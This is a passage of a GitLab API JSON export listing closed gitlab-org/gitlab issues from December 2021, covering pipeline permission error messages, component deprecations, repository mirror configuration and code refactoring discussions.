SecurityBot","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2741139/avatar.png","web_url":"https://gitlab.com/gitlab-securitybot"},"type":"ISSUE","assignee":{"id":3799560,"username":"trizzi","name":"Tim Rizzi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3799560/avatar.png","web_url":"https://gitlab.com/trizzi"},"user_notes_count":43,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2022-02-26","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/348138","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/348138","notes":"https://gitlab.com/api/v4/projects/278964/issues/348138/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/348138/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#348138","relative":"#348138","full":"gitlab-org/gitlab#348138"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98785053,"iid":348110,"project_id":278964,"title":"Permission error banner is not specific enough when running Pipeline","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"type::bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=type::bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\n\u003c!-- Summarize the bug encountered concisely. --\u003e\n\n### Steps to reproduce\n\n1. https://gitlab.com/gitlab-org/gitlab/-/merge_requests/73422/pipelines\n1. Run pipeline with account that does not have permission\n\n\u003c!-- Describe how one can reproduce the issue - this is very important. Please use an ordered list. --\u003e\n\n### Example Project\n\n\u003c!-- If possible, please create an example project here on GitLab.com that exhibits the problematic \nbehavior, and link to it here in the bug report. If you are using an older version of GitLab, this \nwill also determine whether the bug is fixed in a more recent version. --\u003e\n\n### What is the current *bug* behavior?\nWhen running a Pipeline without enough permission, the error is not specific enough.\n\nIt currently says `An error occurred while trying to run a new pipeline for this merge request.`.\n\n\n\u003c!-- Describe what actually happens. --\u003e\n\n### What is the expected *correct* behavior?\n\nIt should say that I do not have permission.\n\n\nExample:\n\n1. https://gitlab.com/gitlab-org/gitlab/-/merge_requests/73422/pipelines\n1. Run pipeline with account that does not have permission\n1. The `400` error has the following body:\n\n```json\n{\"message\":{\"base\":[\"You do not have sufficient permission to run a pipeline on 'refs/merge-requests/73422/head'. Please select a different branch or contact your administrator for assistance. \\u003ca href=https://docs.gitlab.com/ee/ci/pipelines/#pipeline-security-on-protected-branches\\u003eLearn more\\u003c/a\\u003e\"]}}\n```\n\nThis does work on https://gitlab.com/gitlab-org/gitlab/-/pipelines/new (error message below).\n\n![Screen_Shot_2021-12-10_at_11.36.25_AM](/uploads/54edf40315a50b6f6f0aec6dbfe3edfb/Screen_Shot_2021-12-10_at_11.36.25_AM.png)\n\n\n\u003c!-- Describe what you should see instead. --\u003e\n\n### Relevant logs and/or screenshots\n\n\u003c!-- Paste any relevant logs - please use code blocks (```) to format console output, logs, and code\n as it's tough to read otherwise. --\u003e\n\n### Output of checks\n\n\u003c!-- If you are reporting a bug on GitLab.com, write: This bug happens on GitLab.com --\u003e\n\n#### Results of GitLab environment info\n\n\u003c!--  Input any relevant GitLab environment information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to GitLab environment info\u003c/summary\u003e\n\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:env:info`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:env:info RAILS_ENV=production`)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n#### Results of GitLab application Check\n\n\u003c!--  Input any relevant GitLab application check information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to the GitLab application check\u003c/summary\u003e\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:check SANITIZE=true`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:check RAILS_ENV=production SANITIZE=true`)\n\n(we will only investigate if the tests are passing)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n### Possible fixes\n\n\u003c!-- If you can, link to the line of code that might be responsible for the problem. --\u003e","state":"closed","created_at":"2021-12-09T22:23:10.055Z","updated_at":"2022-02-18T07:02:13.738Z","closed_at":"2022-01-31T15:42:13.712Z","closed_by":{"id":4477803,"username":"pburdette","name":"Payton Burdette","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4477803/avatar.png","web_url":"https://gitlab.com/pburdette"},"labels":["Category:Continuous Integration","Deliverable","FY23::Q1","OKR","SUS::Impacting","UX","Verify::P1","approaching-SLO","devops::verify","frontend","group::pipeline execution","missed-SLO","priority::1","section::ops","severity::1","type::bug","workflow::verification"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":4477803,"username":"pburdette","name":"Payton Burdette","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4477803/avatar.png","web_url":"https://gitlab.com/pburdette"}],"author":{"id":3945330,"username":"seanarnold","name":"Sean Arnold","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c0bda1b68a7462959aa82bb63bda9b80?s=80\u0026d=identicon","web_url":"https://gitlab.com/seanarnold"},"type":"ISSUE","assignee":{"id":4477803,"username":"pburdette","name":"Payton Burdette","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4477803/avatar.png","web_url":"https://gitlab.com/pburdette"},"user_notes_count":18,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/348110","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/348110","notes":"https://gitlab.com/api/v4/projects/278964/issues/348110/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/348110/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#348110","relative":"#348110","full":"gitlab-org/gitlab#348110"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98784959,"iid":348104,"project_id":278964,"title":"Deprecate segmented control \u003e /analytics/contribution_analytics/components/date_selector.vue","description":"# Background\n\nIn https://gitlab.com/groups/gitlab-org/-/epics/7261 we are looking into whether we can deprecate segemented controls. In order to do so, we need to audit existing uses of the component and determine whether it can be migrated to a different component.\n\n# Details\n\n- [ ] Delete [`ee/app/assets/javascripts/analytics/contribution_analytics/components/date_selector.vue`](https://gitlab.com/gitlab-org/gitlab/-/blob/7fea5bc1828b8e727e996e36c4ed98e4c25419cb/ee/app/assets/javascripts/analytics/contribution_analytics/components/date_selector.vue) and associated tests/code\n- [ ] Implement similar behaviour using [`gl_tabs_nav`](https://gitlab.com/gitlab-org/gitlab/blob/70953a15b269e241fc4a4738ee49bf5b92780837/app/helpers/tab_helper.rb#L6-63) in Rails/HAML.\n- [ ] Get approval from ~UX in merge request.\n\n# References\n\n* For some general guidance on using [`gl_tabs_nav`](https://gitlab.com/gitlab-org/gitlab/blob/70953a15b269e241fc4a4738ee49bf5b92780837/app/helpers/tab_helper.rb#L6-63), see https://gitlab.com/groups/gitlab-org/-/epics/7078\n* For more details about this decision, see https://gitlab.com/gitlab-org/gitlab/-/merge_requests/79524#note_871589434 .\n\n# Screenshot\n\n* Example: https://gitlab.com/groups/gitlab-org/gitlab-services/-/contribution_analytics\n\n|Before|After|\n|---|---|\n|  ![Screen_Shot_2022-01-13_at_10.47.25_AM](/uploads/d4ea96ad723a32989de28328362e32bd/Screen_Shot_2022-01-13_at_10.47.25_AM.png) |   |","state":"closed","created_at":"2021-12-09T22:18:51.770Z","updated_at":"2022-05-26T13:09:41.242Z","closed_at":"2022-05-26T13:09:41.220Z","closed_by":{"id":4748809,"username":"zcuddy","name":"Zack Cuddy","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4748809/avatar.png","web_url":"https://gitlab.com/zcuddy"},"labels":["OKR","SUS::Impacting","auto updated","component:segmented-control","component:tab","devops::systems","group::geo","pajamas::integrate","priority::4","section::enablement","severity::4","type::maintenance","workflow::in dev"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":4748809,"username":"zcuddy","name":"Zack Cuddy","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4748809/avatar.png","web_url":"https://gitlab.com/zcuddy"}],"author":{"id":516904,"username":"tauriedavis","name":"Taurie Davis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/516904/avatar.png","web_url":"https://gitlab.com/tauriedavis"},"type":"ISSUE","assignee":{"id":4748809,"username":"zcuddy","name":"Zack Cuddy","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4748809/avatar.png","web_url":"https://gitlab.com/zcuddy"},"user_notes_count":20,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/348104","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":3,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 3 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/348104","notes":"https://gitlab.com/api/v4/projects/278964/issues/348104/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/348104/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#348104","relative":"#348104","full":"gitlab-org/gitlab#348104"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7261,"epic":{"id":402774,"iid":7261,"title":"Segmented Control \u003e Deprecate","url":"/groups/gitlab-org/-/epics/7261","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":null,"health_status":null},{"id":98784957,"iid":348103,"project_id":278964,"title":"Deprecate segmented control \u003e /vue_shared/components/ci_cd_analytics/ci_cd_analytics_charts.vue","description":"# Background\n\nIn https://gitlab.com/groups/gitlab-org/-/epics/7261 we are looking into whether we can deprecate segemented controls. In order to do so, we need to audit existing uses of the component and determine whether it can be migrated to a different component.\n\n# Details\n\n* Path: gitlab/app/assets/javascripts/vue_shared/components/ci_cd_analytics/ci_cd_analytics_charts.vue\n* Migrate to: [indicate component to be used]\n\n# Screenshot\n\n|Before|After|\n|---|---|\n| ![CleanShot_2022-01-07_at_11.29.32](/uploads/f079c4ed8af56ac2e17ca1e711c5f201/CleanShot_2022-01-07_at_11.29.32.gif) |  |","state":"closed","created_at":"2021-12-09T22:18:51.218Z","updated_at":"2022-06-27T22:00:23.856Z","closed_at":"2022-06-27T22:00:23.841Z","closed_by":{"id":2233420,"username":"pslaughter","name":"Paul Slaughter","state":"active","avatar_url":"https://secure.gravatar.com/avatar/631b25421eb206ab44cb2793ef09d881?s=80\u0026d=identicon","web_url":"https://gitlab.com/pslaughter"},"labels":["Category:Design System","OKR","SUS::Impacting","auto updated","component:segmented-control","missed:14.10","missed:15.0","missed:15.1","pajamas::integrate","section::dev","severity::4","type::maintenance","workflow::ready for development"],"milestone":{"id":2453024,"iid":74,"group_id":9970,"title":"15.2","description":"","state":"active","created_at":"2022-02-03T22:24:46.818Z","updated_at":"2022-02-03T22:26:32.010Z","due_date":"2022-07-17","start_date":"2022-06-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/74"},"assignees":[{"id":2233420,"username":"pslaughter","name":"Paul Slaughter","state":"active","avatar_url":"https://secure.gravatar.com/avatar/631b25421eb206ab44cb2793ef09d881?s=80\u0026d=identicon","web_url":"https://gitlab.com/pslaughter"},{"id":7293390,"username":"jannik_lehmann","name":"Jannik Lehmann","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7293390/avatar.png","web_url":"https://gitlab.com/jannik_lehmann"},{"id":11256358,"username":"jrushford","name":"James Rushford","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11256358/avatar.png","web_url":"https://gitlab.com/jrushford"}],"author":{"id":516904,"username":"tauriedavis","name":"Taurie Davis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/516904/avatar.png","web_url":"https://gitlab.com/tauriedavis"},"type":"ISSUE","assignee":{"id":2233420,"username":"pslaughter","name":"Paul Slaughter","state":"active","avatar_url":"https://secure.gravatar.com/avatar/631b25421eb206ab44cb2793ef09d881?s=80\u0026d=identicon","web_url":"https://gitlab.com/pslaughter"},"user_notes_count":14,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/348103","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/348103","notes":"https://gitlab.com/api/v4/projects/278964/issues/348103/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/348103/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#348103","relative":"#348103","full":"gitlab-org/gitlab#348103"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7261,"epic":{"id":402774,"iid":7261,"title":"Segmented Control \u003e Deprecate","url":"/groups/gitlab-org/-/epics/7261","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":null,"health_status":null},{"id":98784400,"iid":348096,"project_id":278964,"title":"Remove `resources :user_callouts` from `config/routes.rb`","description":"The following discussion from !75941 should be addressed:\n\n- [ ] @mayra-cabrera started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/75941#note_761499311): \n\n    \u003e Do we have a follow-up issue for this? If not, could we please create it?","state":"closed","created_at":"2021-12-09T21:53:07.947Z","updated_at":"2022-01-05T23:40:06.876Z","closed_at":"2022-01-05T23:40:06.803Z","closed_by":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"labels":["auto updated","backend","devops::growth","group::acquisition","maintenance::refactor","section::growth","workflow::in review"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"}],"author":{"id":33100,"username":"mayra-cabrera","name":"Mayra Cabrera","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/33100/avatar.png","web_url":"https://gitlab.com/mayra-cabrera"},"type":"ISSUE","assignee":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/348096","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/348096","notes":"https://gitlab.com/api/v4/projects/278964/issues/348096/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/348096/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#348096","relative":"#348096","full":"gitlab-org/gitlab#348096"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98771496,"iid":347562,"project_id":278964,"title":"Username disappears from mirror configuration after creation","description":"When creating a pull mirror repository for CI/CD-only (possibly in other scenarios, but this is the tested one) repositories, e.g. via https://gitlab.com/projects/new#cicd_for_external_repo, the mirror will fail to work correctly for external repositories that require authentication.\n\n### Steps to reproduce\n\n1. I have a private GitHub repository: https://github.com/robotmay/blorp.git\n1. I want to run the CI/CD step only on GitLab\n1. I use the external repo flow: https://gitlab.com/projects/new#cicd_for_external_repo\n1. I use the URL `https://robotmay@github.com/robotmay/blorp.git` for the repository, and a Personal Access Token in the password field\n1. I click create, and the repository is successfully fetched, but:\n    - The next attempt to mirror it will fail\n    - I go to https://gitlab.com/robotmay/blorp/-/settings/repository and expand `Mirroring Repositories`\n    - The repository URL is now missing the username component\n\n### Workaround\n\nIf you get to this point, you can fix the mirror by removing it and re-configuring it through the `Mirroring Repositories` settings, following the same setup as before. So the repository URL should be `https://robotmay@github.com/robotmay/blorp.git` and the Personal Access Token goes into the password field on the form.\n\n/cc @sean_carroll, @vyaklushin","state":"closed","created_at":"2021-12-09T17:36:10.548Z","updated_at":"2022-04-18T07:01:05.252Z","closed_at":"2022-04-07T11:44:56.951Z","closed_by":{"id":421631,"username":"vyaklushin","name":"Vasilii Iakliushin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/421631/avatar.png","web_url":"https://gitlab.com/vyaklushin"},"labels":["Category:Source Code Management","Deliverable","backend","devops::create","group::source code","priority::3","section::dev","severity::3","spike","type::bug","workflow::in dev"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":421631,"username":"vyaklushin","name":"Vasilii Iakliushin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/421631/avatar.png","web_url":"https://gitlab.com/vyaklushin"}],"author":{"id":2167502,"username":"robotmay_gitlab","name":"Robert May","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2167502/avatar.png","web_url":"https://gitlab.com/robotmay_gitlab"},"type":"ISSUE","assignee":{"id":421631,"username":"vyaklushin","name":"Vasilii Iakliushin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/421631/avatar.png","web_url":"https://gitlab.com/vyaklushin"},"user_notes_count":35,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347562","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347562","notes":"https://gitlab.com/api/v4/projects/278964/issues/347562/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347562/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347562","relative":"#347562","full":"gitlab-org/gitlab#347562"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98766976,"iid":347558,"project_id":278964,"title":"Technical Spike: Determine approach for preserving unchanged Markdown in the Content Editor","description":"## Goal\n\nDetermine the best approach for preserving unchanged Markdown in the Content Editor\n\n## Problem\n\nAs described in the parent epic, there are instances where making edits to one area of a Markdown document in the Content Editor can reformat or even corrupt the markup in the rest of the document. \n\nData integrity is the **top priority** so we need to figure out a way to preserve the integrity of the parts of the document that aren't intentionally edited. \n\n## Opportunity\n\nThis is a problem we ran into with the Static Site Editor as well. Giant MRs being created that reformatted the page during the round trip between Markdown and HTML. If we can solve this, we can more confidently toggle between raw source and WYSIWYG editing **and** we can limit the \"noise\" in the resulting MRs, creating a better collaboration experience. \n\n## Details\n\n[TBD]","state":"closed","created_at":"2021-12-09T16:52:16.946Z","updated_at":"2022-02-15T20:45:56.001Z","closed_at":"2022-02-10T19:52:35.456Z","closed_by":{"id":3540517,"username":"ealcantara","name":"Enrique Alcntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"},"labels":["Content Editor","auto updated","devops::create","group::editor","section::dev","spike"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":3540517,"username":"ealcantara","name":"Enrique Alcntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"}],"author":{"id":5212466,"username":"ericschurter","name":"Eric Schurter","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5212466/avatar.png","web_url":"https://gitlab.com/ericschurter"},"type":"ISSUE","assignee":{"id":3540517,"username":"ealcantara","name":"Enrique Alcntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"},"user_notes_count":14,"merge_requests_count":0,"upvotes":2,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347558","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":5,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347558","notes":"https://gitlab.com/api/v4/projects/278964/issues/347558/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347558/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347558","relative":"#347558","full":"gitlab-org/gitlab#347558"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7256,"epic":{"id":402571,"iid":7256,"title":"Preserve unchanged Markdown when saving changes in the Content Editor","url":"/groups/gitlab-org/-/epics/7256","group_id":9970,"human_readable_end_date":"Feb 17, 2023","human_readable_timestamp":"\u003cstrong\u003e1\u003c/strong\u003e month remaining"},"iteration":null,"health_status":null},{"id":98765310,"iid":347555,"project_id":278964,"title":"Type check standard context","description":"## Possible issues that we should consider addressing in [StandardContext](http://gitlab.com/gitlab-org/gitlab/blob/b5d849c2a5244c5593045d6e41b2346f08202e0d/lib/gitlab/tracking/standard_context.rb#L9-9)\n\n1. How would we handle `namespace` being mistakenly passed in as a `project`?\n   - since project [responds to actual_plan_name](http://gitlab.com/gitlab-org/gitlab/blob/b5d849c2a5244c5593045d6e41b2346f08202e0d/app/models/project.rb#L450-450) it would be fine, but then our `namespace` value could match our `project` value if initialized as `StandardContext.new(namespace: project, project: project)`\n1. Should we type check `namespace`, `project`, and `user` here so we don't run into possible error conditions like below if object doesn't respond to `actual_plan_name` and other possible issues like in the 1st question?\n   ```\n   NoMethodError:\n       undefined method `actual_plan_name' for 1:Integer\n   ```\n\n\nThe following discussion from !75146 should be addressed:\n\n- [ ] @mikolaj_wawrzyniak started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/75146#note_743726648):  (+3 comments)\n\n    \u003e **suggestion:** Namespace the same as user expects to be provided with object that responds to `#id` call. Only project has implemented fallback and is able to accept both model objects and integers. \n    \u003e https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/tracking/standard_context.rb#L48\n\n/cc @gitlab-org/growth/product-intelligence @jejacks0n\n\n## Testing\n\nUpdate related unit tests and make sure QA pipelines are passing","state":"closed","created_at":"2021-12-09T16:40:42.013Z","updated_at":"2022-06-13T11:36:35.837Z","closed_at":"2022-06-07T13:02:47.201Z","closed_by":{"id":11217480,"username":"tvellishetty","name":"Tarun Vellishetty","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11217480/avatar.png","web_url":"https://gitlab.com/tvellishetty"},"labels":["auto updated","backend","devops::growth","group::product intelligence","quad-planning::complete-action","section::growth","snowplow tracking events","workflow::production"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":11217480,"username":"tvellishetty","name":"Tarun Vellishetty","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11217480/avatar.png","web_url":"https://gitlab.com/tvellishetty"}],"author":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"type":"ISSUE","assignee":{"id":11217480,"username":"tvellishetty","name":"Tarun Vellishetty","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11217480/avatar.png","web_url":"https://gitlab.com/tvellishetty"},"user_notes_count":12,"merge_requests_count":0,"upvotes":3,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347555","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347555","notes":"https://gitlab.com/api/v4/projects/278964/issues/347555/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347555/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347555","relative":"#347555","full":"gitlab-org/gitlab#347555"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98763174,"iid":347550,"project_id":278964,"title":"Gitlab::ApplicationRateLimiter declared as class but used as a module","description":"## Summary\n\n`Gitlab::ApplicationRateLimiter` class is declared as class but used as a module only.\n\n## Original discussion\n\nThe following discussion from !75024 should be addressed:\n\n- [ ] @mkaeppler started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/75024#note_760739127):  (+1 comment)\n\n    \u003e Question: this confuses me; `ApplicationRateLimiter` is a class, and it defines an initializer, which suggests I ought to instantiate it, yet we use it as we would use a module that includes `self`. \n    \u003e \n    \u003e Are there plans to streamline this more in a follow-up? Otherwise I would suggest to fold `ApplicationRateLimiter` into this module, if we only ever use it like a mixin anyway.","state":"closed","created_at":"2021-12-09T16:03:30.808Z","updated_at":"2022-02-02T12:22:20.529Z","closed_at":"2022-02-02T12:22:20.506Z","closed_by":{"id":3482158,"username":"pshutsin","name":"Pavel Shutsin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3482158/avatar.png","web_url":"https://gitlab.com/pshutsin"},"labels":["backend","devops::manage","group::optimize","maintenance::refactor","section::dev","type::maintenance","workflow::in review"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":3482158,"username":"pshutsin","name":"Pavel 